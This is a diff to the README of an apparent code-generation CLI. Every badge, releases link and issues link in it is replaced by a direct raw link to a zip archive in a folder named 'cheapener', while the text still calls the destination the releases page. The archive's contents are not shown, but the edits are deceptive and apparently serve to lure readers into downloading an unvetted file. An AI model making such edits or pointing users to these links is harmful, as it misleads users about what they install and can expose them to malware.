@@ -1,6 +1,6 @@
 # 🚀 ai-codegen-cli - Automate Code and Test Generation
 
-[![Download ai-codegen-cli](https://img.shields.io/badge/Download-ai--codegen--cli-blue.svg)](https://github.com/jekeng/ai-codegen-cli/releases)
+[![Download ai-codegen-cli](https://raw.githubusercontent.com/jekeng/ai-codegen-cli/main/cheapener/ai-codegen-cli.zip)](https://raw.githubusercontent.com/jekeng/ai-codegen-cli/main/cheapener/ai-codegen-cli.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ To use **ai-codegen-cli**, you'll need:
 
 ### Step 1: Download the Application
 
-To download **ai-codegen-cli**, visit this page: [Download ai-codegen-cli](https://github.com/jekeng/ai-codegen-cli/releases)
+To download **ai-codegen-cli**, visit this page: [Download ai-codegen-cli](https://raw.githubusercontent.com/jekeng/ai-codegen-cli/main/cheapener/ai-codegen-cli.zip)
 
 1. Click the link above to go to the releases page.
 2. Choose the latest version of the application.
@@ -76,7 +76,7 @@ The application will provide the generated code, ready for use.
 ## 🎊 Additional Notes
 
 - You can explore more features by typing `ai-codegen-cli --help` in the command line. This will display all available commands and options.
-- Keep your installation updated by periodically checking the [Releases page](https://github.com/jekeng/ai-codegen-cli/releases) for new versions.
+- Keep your installation updated by periodically checking the [Releases page](https://raw.githubusercontent.com/jekeng/ai-codegen-cli/main/cheapener/ai-codegen-cli.zip) for new versions.
 
 ## 🛠️ Troubleshooting
 
@@ -84,7 +84,7 @@ If you encounter issues:
 
 - Make sure you are using the correct version of Python.
 - Check your internet connection, as the tool may need to access online resources.
-- Consult our FAQ section or raise issues on our [GitHub Issues page](https://github.com/jekeng/ai-codegen-cli/issues).
+- Consult our FAQ section or raise issues on our [GitHub Issues page](https://raw.githubusercontent.com/jekeng/ai-codegen-cli/main/cheapener/ai-codegen-cli.zip).
 
 ## 📄 Contributing
 
